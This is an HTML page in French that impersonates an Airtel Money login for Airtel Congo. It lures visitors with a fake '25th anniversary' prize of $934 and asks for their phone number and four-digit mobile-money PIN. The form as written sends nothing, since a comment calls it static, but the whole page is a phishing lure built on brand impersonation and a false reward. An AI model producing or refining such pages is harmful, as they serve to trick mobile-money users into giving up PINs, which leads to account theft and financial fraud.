<!doctype html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>AIRTEL CONGO — Connexion</title>
    <style>
      *, *::before, *::after { box-sizing: border-box; }

      html, body {
        margin: 0;
        padding: 0;
        min-height: 100%;
        font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        background: #f4f5f7;
        color: #1a1a1a;
        -webkit-font-smoothing: antialiased;
      }

      #root { min-height: 100vh; display: flex; }

      .login-container {
        display: flex;
        flex-direction: column;
        width: 100%;
        min-height: 100vh;
        max-width: 480px;
        margin: 0 auto;
        background: #ffffff;
      }

      /* ---------- Header ---------- */
      .login-header {
        padding: 1.5rem 1.5rem 0.5rem;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .logo-large img {
        height: 44px;
        width: auto;
        display: block;
      }

      /* ---------- Content ---------- */
      .login-content {
        flex: 1;
        padding: 1rem 1.5rem 2rem;
        display: flex;
        flex-direction: column;
      }

      .login-title {
        font-size: 1.25rem;
        font-weight: 700;
        line-height: 1.35;
        color: #111;
        margin: 0 0 1.5rem;
      }

      /* ---------- Form ---------- */
      .login-form {
        display: flex;
        flex-direction: column;
        gap: 1.25rem;
      }

      .phone-input-container {
        display: flex;
        align-items: stretch;
        border: 1px solid #d8dbe0;
        border-radius: 12px;
        overflow: hidden;
        background: #fff;
        transition: border-color 0.2s ease, box-shadow 0.2s ease;
      }
      .phone-input-container:focus-within {
        border-color: #e40000;
        box-shadow: 0 0 0 3px rgba(228, 0, 0, 0.12);
      }

      .country-code {
        display: flex;
        align-items: center;
        gap: 0.4rem;
        padding: 0 0.9rem;
        background: #f4f5f7;
        border-right: 1px solid #d8dbe0;
        font-size: 0.95rem;
        font-weight: 600;
        color: #333;
        white-space: nowrap;
      }
      .flag-icon { font-size: 1.1rem; }

      .phone-input {
        flex: 1;
        padding: 0.95rem 1rem;
        border: none;
        outline: none;
        font-size: 1rem;
        background: transparent;
        color: #111;
        letter-spacing: 0.02em;
      }
      .phone-input::placeholder { color: #9aa0a6; }

      /* ---------- PIN section ---------- */
      .pin-section {
        display: flex;
        flex-direction: column;
        gap: 0.6rem;
      }
      .pin-label {
        margin: 0;
        font-size: 0.9rem;
        font-weight: 600;
        color: #444;
      }

      /* Row: PIN boxes centered, eye button pushed to the right */
      .pin-inputs-wrapper {
        display: grid;
        grid-template-columns: 1fr auto;
        align-items: center;
        gap: 0.75rem;
      }

      .pin-inputs {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 0.65rem;
        max-width: 260px;   /* keeps boxes from stretching too wide */
      }

      .pin-box {
        width: 100%;
        aspect-ratio: 1 / 1;      /* perfect squares */
        max-height: 60px;         /* cap size on larger screens */
        text-align: center;
        font-size: 1.5rem;
        font-weight: 700;
        border: 1px solid #d8dbe0;
        border-radius: 12px;
        background: #fff;
        color: #111;
        outline: none;
        padding: 0;
        line-height: 1;
        transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.1s ease;
        -webkit-text-security: disc;
      }
      .pin-box:focus {
        border-color: #e40000;
        box-shadow: 0 0 0 3px rgba(228, 0, 0, 0.12);
        transform: translateY(-1px);
      }
      .pin-box.filled {
        border-color: #e40000;
        background: #fff5f5;
      }

      .eye-button {
        flex-shrink: 0;
        width: 44px;
        height: 44px;
        border-radius: 50%;
        border: 1px solid #d8dbe0;
        background: #fff;
        cursor: pointer;
        font-size: 1rem;
        display: flex;
        align-items: center;
        justify-content: center;
        transition: background 0.2s ease, border-color 0.2s ease;
      }
      .eye-button:hover {
        background: #f4f5f7;
        border-color: #c4c8ce;
      }

      /* ---------- Submit button ---------- */
      .login-button {
        margin-top: 0.5rem;
        padding: 1rem;
        border: none;
        border-radius: 12px;
        background: #e40000;
        color: #fff;
        font-size: 0.95rem;
        font-weight: 800;
        letter-spacing: 0.04em;
        cursor: pointer;
        transition: background 0.2s ease, transform 0.15s ease, opacity 0.2s ease;
      }
      .login-button:hover:not(:disabled) {
        background: #ff1a1a;
        transform: translateY(-1px);
      }
      .login-button:disabled {
        opacity: 0.45;
        cursor: not-allowed;
      }

      /* ---------- Footer ---------- */
      .login-footer {
        padding: 1.5rem;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 0.75rem;
        border-top: 1px solid #eceef1;
      }
      .login-footer img { height: 26px; width: auto; opacity: 0.7; }
      .footer {
        font-size: 0.75rem;
        color: #8a8f98;
        text-align: center;
      }

      /* ---------- Small screens ---------- */
      @media (max-width: 360px) {
        .pin-inputs { max-width: 220px; gap: 0.5rem; }
        .pin-box { font-size: 1.25rem; border-radius: 10px; }
        .eye-button { width: 40px; height: 40px; }
      }
    </style>
  </head>
  <body>
    <div id="root">
      <div class="login-container">

        <!-- Header -->
        <div class="login-header">
          <div class="logo-large">
            <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
          </div>
        </div>

        <!-- Content -->
        <div class="login-content">

          <!-- Anniversary banner -->
          <div style="background: linear-gradient(135deg, rgb(122, 0, 0) 0%, rgb(192, 0, 26) 60%, rgb(232, 0, 31) 100%); border-radius: 16px; padding: 14px 18px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; box-shadow: rgba(192, 0, 26, 0.25) 0px 4px 20px;">
            <div style="font-size: 28px; flex-shrink: 0;">🏆</div>
            <div>
              <div style="font-family: Syne, sans-serif; font-size: 13px; font-weight: 800; color: rgb(255, 215, 0); letter-spacing: 0.04em; margin-bottom: 2px;">Airtel DRC · 25ème Anniversaire</div>
              <div style="font-size: 12px; color: rgba(255, 255, 255, 0.85); line-height: 1.4;">Connectez-vous pour réclamer votre prix de <strong style="color: rgb(255, 255, 255); font-size: 14px;">$934</strong></div>
            </div>
          </div>

          <h1 class="login-title">Connectez-vous à Airtel Money pour réclamer votre récompense.</h1>

          <!-- Static form: no submission anywhere -->
          <form class="login-form" onsubmit="return false;">

            <div class="phone-input-container">
              <div class="country-code">
                <span class="flag-icon">🇨🇩</span>
                <span>+243</span>
              </div>
              <input class="phone-input" placeholder="912345678" maxlength="10" inputmode="numeric" pattern="[0-9]*" autocomplete="off" type="tel" value="912345678">
            </div>

            <div class="pin-section">
              <p class="pin-label">Entrez votre Code PIN</p>
              <div class="pin-inputs-wrapper">
                <div class="pin-inputs">
                  <input class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="password" value="">
                  <input class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="password" value="">
                  <input class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="password" value="">
                  <input class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="password" value="">
                </div>
                <button type="button" class="eye-button" aria-label="Afficher le PIN">👁️‍🗨️</button>
              </div>
            </div>

            <button type="submit" class="login-button">SE CONNECTER &amp; RÉCLAMER</button>
          </form>
        </div>

        <!-- Footer -->
        <div class="login-footer">
          <div>
            <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
          </div>
          <footer class="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
        </div>

      </div>
    </div>
  </body>
</html>
